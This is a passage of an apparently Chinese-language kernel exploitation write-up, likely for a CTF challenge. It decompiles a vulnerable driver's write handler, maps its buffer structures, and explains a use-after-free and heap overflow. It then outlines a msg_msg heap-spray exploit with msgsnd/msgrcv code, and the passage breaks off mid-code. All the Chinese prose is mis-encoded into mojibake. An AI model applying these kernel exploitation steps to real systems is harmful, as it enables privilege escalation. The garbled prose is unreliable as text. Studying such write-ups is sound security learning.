class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨é©±åŠ¨çš„è¿™ä¸ªreadå‡½æ•°ä¸­è¢«åˆ†ä¸ºäº†ä¸¤å—ï¼Œåœ¨ä¸‹åŠéƒ¨åˆ†å¯ä»¥çœ‹åˆ°ä¸€ç›´ä½¿ç”¨çš„æ˜¯<code>__indword</code>å‡½æ•°ï¼Œè€Œè¿™ä¸ªæ˜¯å¯¹äºè®¾å¤‡çš„IOæ“ä½œï¼Œæ‰€ä»¥ä¸‹åŠéƒ¨åˆ†å°±æ˜¯å¯¹äºè®¾å¤‡çš„æ§åˆ¶ï¼Œä¸ŠåŠéƒ¨åˆ†åˆ™æ˜¯å¯¹äºå†…æ ¸ä¸­è‡ªèº«çš„æ“ä½œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">bytedev_write</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 a3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v5; <span class="comment">// eax</span></span><br><span class="line">  __int64 v6; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// r9d</span></span><br><span class="line">  <span class="keyword">int</span> read_idx; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  __int64 v10; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// edx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 remaining_size; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  _WORD *chunk; <span class="comment">// r13</span></span><br><span class="line">  __int64 user_buf; <span class="comment">// r12</span></span><br><span class="line">  __int64 write_offset; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// r13</span></span><br><span class="line">  _DWORD *v19; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v20; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v21; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v22; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v23; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v24; <span class="comment">// eax</span></span><br><span class="line">  __int64 v25; <span class="comment">// rbx</span></span><br><span class="line">  _WORD *v27; <span class="comment">// rax</span></span><br><span class="line">  _WORD *v28; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v30; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))_fentry__)();</span><br><span class="line">  a3 = v2;</span><br><span class="line">  v4 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v32 = v4 + <span class="number">0x28</span>;</span><br><span class="line">  raw_spin_lock(v4 + <span class="number">0x28</span>);</span><br><span class="line">  v5 = __indword(*(_QWORD *)(v4 + <span class="number">0x20</span>));</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = <span class="number">0x200</span>LL;</span><br><span class="line">      v21 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">      <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x200</span> )</span><br><span class="line">        v20 = a3;</span><br><span class="line">      v22 = *(_QWORD *)(v21 + <span class="number">0x20</span>);</span><br><span class="line">      v10 = v20;</span><br><span class="line">      v23 = __indword(v22);</span><br><span class="line">      <span class="keyword">if</span> ( v23 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v24 = __indword(v22 + <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v24 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v25 = *(_QWORD *)(v21 + <span class="number">0x18</span>);</span><br><span class="line">          _check_object_size(v25, v20, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( copy_from_user(v25, a2, v10) )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = <span class="number">-14LL</span>;</span><br><span class="line">            printk(&amp;unk_1090);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v10 = <span class="number">-14LL</span>;</span><br><span class="line">          printk(&amp;unk_FF0);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="number">-14LL</span>;</span><br><span class="line">        printk(&amp;unk_FC0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">-14LL</span>;</span><br><span class="line">      printk(&amp;unk_1038);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    idx = *(_DWORD *)(v6 + <span class="number">0xB4</span>);</span><br><span class="line">    read_idx = *(_DWORD *)(v6 + <span class="number">0xB0</span>);</span><br><span class="line">    v9 = idx + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (idx + <span class="number">1</span>) % <span class="number">16</span> != read_idx</span><br><span class="line">      || (v28 = *(_WORD **)(v6 + <span class="number">8LL</span> * idx + <span class="number">0x30</span>)) == <span class="number">0LL</span></span><br><span class="line">      || (v10 = <span class="number">-14LL</span>, *v28 &lt;= <span class="number">0xFFB</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v9 % <span class="number">16</span> == read_idx )</span><br><span class="line">          &#123;</span><br><span class="line">            v27 = *(_WORD **)(v6 + <span class="number">8LL</span> * idx + <span class="number">0x30</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v27 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( *v27 &gt; <span class="number">0xFFB</span>u )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          chunk = *(_WORD **)(v6 + <span class="number">8LL</span> * ((idx + <span class="number">0xF</span>) % <span class="number">16</span>) + <span class="number">0x30</span>);</span><br><span class="line">          user_buf = a2 + v10;</span><br><span class="line">          <span class="keyword">if</span> ( chunk &amp;&amp; (write_offset = (<span class="keyword">unsigned</span> __int16)*chunk, (_WORD)write_offset != <span class="number">0xFFC</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = (<span class="keyword">unsigned</span> __int16)write_offset;</span><br><span class="line">            v12 = (__int64)chunk + write_offset + <span class="number">4</span>;</span><br><span class="line">            remaining_size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">0xFFC</span> - v11);</span><br><span class="line">            <span class="keyword">if</span> ( remaining_size &gt; a3 )</span><br><span class="line">              remaining_size = a3;</span><br><span class="line">            <span class="keyword">if</span> ( (remaining_size &amp; <span class="number">0x80000000</span>) != <span class="number">0LL</span> )</span><br><span class="line">              BUG();</span><br><span class="line">            v30 = v12;</span><br><span class="line">            _check_object_size(v12, remaining_size, <span class="number">0LL</span>);</span><br><span class="line">            v14 = copy_from_user(v30, user_buf, remaining_size);</span><br><span class="line">            <span class="keyword">if</span> ( v14 )</span><br><span class="line">            &#123;</span><br><span class="line">              v10 = v14;</span><br><span class="line">              printk(&amp;unk_1060);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            *chunk += remaining_size;</span><br><span class="line">            a3 -= remaining_size;</span><br><span class="line">            v10 += remaining_size;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v31 = idx;</span><br><span class="line">            v18 = <span class="number">0xFFC</span>LL;</span><br><span class="line">            v19 = (_DWORD *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">26</span>], <span class="number">0x400CC0</span>LL, <span class="number">0x1000</span>LL);</span><br><span class="line">            *(_QWORD *)(v6 + <span class="number">8LL</span> * v31 + <span class="number">0x30</span>) = v19;</span><br><span class="line">            <span class="keyword">if</span> ( a3 &lt;= <span class="number">0xFFC</span> )</span><br><span class="line">              v18 = a3;</span><br><span class="line">            *(_DWORD *)(v6 + <span class="number">0xB4</span>) = (*(_DWORD *)(v6 + <span class="number">0xB4</span>) + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">            *v19 = <span class="number">0</span>;</span><br><span class="line">            _check_object_size(v19 + <span class="number">1</span>, v18, <span class="number">0LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( copy_from_user(v19 + <span class="number">1</span>, user_buf, v18) )</span><br><span class="line">              <span class="keyword">return</span> ((__int64 (*)(<span class="keyword">void</span>))bytedev_write_cold_15)();</span><br><span class="line">            a3 -= v18;</span><br><span class="line">            *(_WORD *)v19 += v18;</span><br><span class="line">            v10 += v18;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( !a3 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          idx = *(_DWORD *)(v6 + <span class="number">0xB4</span>);</span><br><span class="line">          read_idx = *(_DWORD *)(v6 + <span class="number">0xB0</span>);</span><br><span class="line">          v9 = idx + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  raw_spin_unlock(v32);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œwriteçš„åšæ³•è·Ÿreadç±»ä¼¼ï¼Œä¾æ—§å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ã€‚é€šè¿‡æˆ‘ä¸Šé¢ä¿®æ”¹çš„å˜é‡åç§°å…¶å®ä¹Ÿå°±å¯ä»¥å¾ˆå¥½çš„æ¨æ–­å‡ºæ¥å®é™…çš„ç»“æ„äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ptr &#123;</span><br><span class="line"><span class="number">0xC8</span> : manager_object</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">manager_object &#123;</span><br><span class="line">(<span class="number">0x30</span> + idx * <span class="number">0x8</span>) : each_data</span><br><span class="line"><span class="number">0xB0</span> : read_idx</span><br><span class="line"><span class="number">0xB4</span> : write_idx</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">each_data &#123;</span><br><span class="line"><span class="number">0x0</span> : write_size</span><br><span class="line"><span class="number">0x2</span> : read_size</span><br><span class="line"><span class="number">0x4</span> â€” <span class="number">0xfff</span> : content</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯ç±»ä¼¼äºä¸Šè¿°è¿™æ ·çš„ç»“æ„ã€‚è¿™é‡Œçš„æ¼æ´ä¸»è¦å‘ç”Ÿäºreadä¸­ï¼Œå¯ä»¥çœ‹åˆ°åœ¨å·²ç»è¯»å–çš„sizeä¸º<code>0xffc</code>æ—¶åˆ™ä¼šfreeæ‰å“åº”çš„objectä½†æ˜¯ï¼Œå®é™…çš„æŒ‡é’ˆå¹¶æ²¡æœ‰è¢«æ¸…é™¤ï¼Œè¿™æ ·ä¹Ÿå°±é€ æˆäº†UAFã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chunk = *(_WORD **)(v6 + <span class="number">8LL</span> * ((idx + <span class="number">0xF</span>) % <span class="number">16</span>) + <span class="number">0x30</span>);</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ( chunk &amp;&amp; (write_offset = (<span class="keyword">unsigned</span> __int16)*chunk, (_WORD)write_offset != <span class="number">0xFFC</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  *(_DWORD *)(v6 + <span class="number">0xB4</span>) = (*(_DWORD *)(v6 + <span class="number">0xB4</span>) + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”åœ¨writeå‡½æ•°ä¸­è™½ç„¶åœ¨ç¬¬ä¸€æ¬¡å†™å…¥çš„æ—¶å€™ä¼šä¿®æ”¹<code>write_idx</code>ä¸º1ä½†æ˜¯åœ¨ç¬¬äºŒæ¬¡è°ƒç”¨çš„æ—¶å€™ä¼šåŠ ä¸Š<code>0xf</code>éšå³å’Œ16å–ä½™ï¼Œè€Œè¿™ä¹Ÿå°±ç­‰ä»·äºå¯¹<code>write_idx</code>å‡ä¸€çš„æ“ä½œï¼Œä¹Ÿå°±ä»¥ä¸ºç€æˆ‘ä»¬ä»ç„¶å¯ä»¥å¯¹åˆšåˆ›å»ºçš„objectè¿›è¡Œä½¿ç”¨ã€‚ä¸è¿‡å‰ææ˜¯è¿˜éœ€è¦ç»•è¿‡è¿™ä¸ªifè¯­å¥ï¼Œå½“ç„¶ç»•è¿‡çš„æ–¹å¼ä¹Ÿæ˜¯ååˆ†ç®€å•ï¼Œè¿™é‡Œä½¿ç”¨<code>sk_buff</code>è¿›è¡Œå †å–·å³å¯å¹¶ä¸”å¦‚æœ<code>write_size</code>æˆ‘ä»¬ä¿®æ”¹ä¸ºæ¯”<code>0xffc</code>å¤§çš„æ•°å­—è¿˜å¯é€ æˆå †æº¢å‡ºã€‚</p><h3 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>è¿™é‡Œçš„åˆ©ç”¨æ–¹å¼ä¾æ—§é‡‡ç”¨<a class="link"   href="https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/" >CVE-2021-22555<i class="fas fa-external-link-alt"></i></a>è¿›è¡Œåˆ©ç”¨ï¼Œä¸ç†Ÿæ‚‰çš„æœ‹å‹å¯ä»¥å»æŸ¥çœ‹æˆ‘å…ˆå‰å¯¹è¿™ä¸€åˆ©ç”¨æ–¹æ³•çš„åˆ†æã€‚</p><p>å› ä¸ºåˆ©ç”¨æ–¹æ³•ä»¥å¾€å·²ç»åˆ†æè¿‡äº†æ‰€ä»¥è¿™é‡Œåªå¯¹å¦‚ä½•è¾¾åˆ°ä¸Šè¿°åˆ©ç”¨çš„æ¡ä»¶åšåˆ†æã€‚</p><p>è¿™é‡Œåˆä¸€æ¬¡ä¸å¾—ä¸æåˆ°ä¸€ä¸ªå¸¸ç”¨çš„ç»“æ„ä½“<code>msg_msg</code>äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„å…³äº<code>msg_msg</code>å’Œ<code>msg_queue</code>ä¹‹é—´çš„ç»“æ„ä¸ºä¸€ä¸ªåŒå‘é“¾è¡¨ç»“æ„ï¼Œå¹¶ä¸”ç»“åˆlinuxæºç å¯ä»¥çœ‹åˆ°å¯»æ‰¾æ¶ˆæ¯çš„è¿‡ç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">find_msg</span><span class="params">(struct msg_queue *msq, <span class="keyword">long</span> *msgtyp, <span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">found</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">long</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">list_for_each_entry(msg, &amp;msq-&gt;q_messages, m_list) &#123;</span><br><span class="line"><span class="keyword">if</span> (testmsg(msg, *msgtyp, mode) &amp;&amp;</span><br><span class="line">    !security_msg_queue_msgrcv(&amp;msq-&gt;q_perm, msg, current,</span><br><span class="line">       *msgtyp, mode)) &#123;</span><br><span class="line"><span class="keyword">if</span> (mode == SEARCH_LESSEQUAL &amp;&amp; msg-&gt;m_type != <span class="number">1</span>) &#123;</span><br><span class="line">*msgtyp = msg-&gt;m_type - <span class="number">1</span>;</span><br><span class="line">found = msg;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == SEARCH_NUMBER) &#123;</span><br><span class="line"><span class="keyword">if</span> (*msgtyp == count)</span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> found ?: ERR_PTR(-EAGAIN);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> list_for_each_entry(pos, head, member)\</span></span><br><span class="line"><span class="meta">for (pos = list_first_entry(head, typeof(*pos), member);\</span></span><br><span class="line"><span class="meta">     !list_entry_is_head(pos, head, member);\</span></span><br><span class="line"><span class="meta">     pos = list_next_entry(pos, member))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> list_first_entry(ptr, type, member) \</span></span><br><span class="line"><span class="meta">list_entry((ptr)-&gt;next, type, member)</span></span><br></pre></td></tr></table></figure><p><strong>å¯ä»¥å‘ç°ä½¿ç”¨nextæŒ‡é’ˆè¿›è¡Œå¯»æ‰¾çš„ï¼Œé‚£ä¹ˆæ ¹æ®åœ¨<code>vuln driver</code>ä¸­å­˜åœ¨çš„æ¼æ´å°±æ˜¯å †æº¢å‡ºï¼Œæ‰€ä»¥ç†æ‰€å½“ç„¶çš„å°±èƒ½å¤Ÿæƒ³åˆ°é€šè¿‡å †æº¢å‡ºä¿®æ”¹ç´§é‚»çš„<code>primary msg_msg</code>ç»“æ„ä½“çš„nextæŒ‡é’ˆæŒ‡å‘éšæœºä¸€ä¸ª<code>seconday msg_msg</code>å³å¯é€ æˆä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘é€šè¿‡ä¸€ä¸ªobjectçš„æƒ…å†µã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬è¿™æ—¶é€šè¿‡åŸæœ¬æŒ‡å‘çš„<code>secondary msg_msg</code>çš„<code>primary msg_msg</code>çš„<code>msg_queue</code>è¿›è¡Œç´¢å¼•å»<code>msgrcv</code>çš„è¯å³å¯é‡Šæ”¾æ‰<code>secondary msg_msg</code>ï¼Œä½†æ˜¯è¿˜å­˜åœ¨ä¸€ä¸ªè¢«å †æº¢å‡ºä¿®æ”¹çš„<code>primary msg_msg</code>çš„nextæŒ‡é’ˆä¾æ—§æŒ‡å‘<code>secondary msg_msg</code>é‚£ä¹ˆæˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡è¢«ç ´åçš„<code>primary msg_msg</code>å»ç´¢å¼•åˆ°å·²ç»è¢«freeæ‰çš„<code>secondary msg_msg</code>ã€‚è¿™ä¹Ÿå°±é€ æˆäº†æˆ‘ä»¬æ‰€æœŸç›¼çš„UAFäº†ã€‚</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">  <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg,</span><br><span class="line">             <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">  <span class="keyword">if</span> (msgsnd(msqid[i], &amp;secondary_msg,</span><br><span class="line">             <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (msgrcv(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, PRIMARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span 